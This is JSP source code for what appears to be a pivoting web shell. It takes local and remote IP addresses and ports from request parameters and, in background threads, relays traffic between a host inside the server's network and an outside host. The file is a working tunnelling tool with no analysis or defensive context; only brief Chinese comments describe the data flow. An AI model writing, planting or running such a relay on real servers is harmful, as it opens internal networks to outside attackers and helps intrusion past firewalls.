<%@page pageEncoding="utf-8"%>
<%@page import="java.io.*"%>
<%@page import="java.util.*"%>
<%@page import="java.util.regex.*"%>
<%@page import="java.sql.*"%>
<%@page import="java.nio.charset.*"%>
<%@page import="javax.servlet.http.HttpServletRequestWrapper"%>
<%@page import="java.text.*"%>
<%@page import="java.net.*"%>
<%
try {
final String localIP = request.getParameter("localIP");
final String localPort = request.getParameter("localPort");
final String remoteIP =request.getParameter("remoteIP");
final String remotePort =request.getParameter("remotePort");
new Thread(new Runnable(){
public void run(){
while (true) {
Socket soc = null;
Socket remoteSoc = null;
DataInputStream remoteIn = null;
DataOutputStream remoteOut = null;
DataInputStream localIn = null;
DataOutputStream localOut = null;
try{
soc = new Socket();
soc.connect(new InetSocketAddress(localIP,Integer.parseInt(localPort)));//连接本地socket
remoteSoc = new Socket();
remoteSoc.connect(new InetSocketAddress(remoteIP,Integer.parseInt(remotePort)));
remoteIn = new DataInputStream(remoteSoc.getInputStream());
remoteOut = new DataOutputStream(remoteSoc.getOutputStream());
localIn = new DataInputStream(soc.getInputStream());
localOut = new DataOutputStream(soc.getOutputStream());
this.readFromLocal(localIn,remoteOut);//读从本地 写入到远程
this.readFromRemote(soc,remoteSoc,remoteIn,localOut);//从远程读，写入到本地
}catch(Exception ex)
{ 
break;
}
} // end while
} // end run
//从本地读
public void readFromLocal(final DataInputStream localIn,final DataOutputStream remoteOut){
new Thread(new Runnable(){
public void run(){
while (true) {
try{
byte[] data = new byte[100];
int len = localIn.read(data); //从本地连接中读出信息，写入到远程socket
while (len != -1) {
remoteOut.write(data,0,len);
len = localIn.read(data);
}
}catch (Exception e) {
break;
}
}
}
}).start();
} // end readFromLocal
//从远程socket读取 内容写入到本地
public void readFromRemote(final Socket soc,final Socket remoteSoc,final DataInputStream remoteIn,final DataOutputStream localOut){
new Thread(new Runnable(){
public void run(){
while(true) {
try{
byte[] data = new byte[100];
int len = remoteIn.read(data);
while (len != -1) {
localOut.write(data,0,len); //从远程读 写入到本地socket
len = remoteIn.read(data);
}
}catch (Exception e) {
try{
soc.close();
remoteSoc.close();
}catch(Exception ex) {
}
break;
}
}
}// end run
}).start();
}
}).start(); //大的线程 结束 并且开始线程
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
%>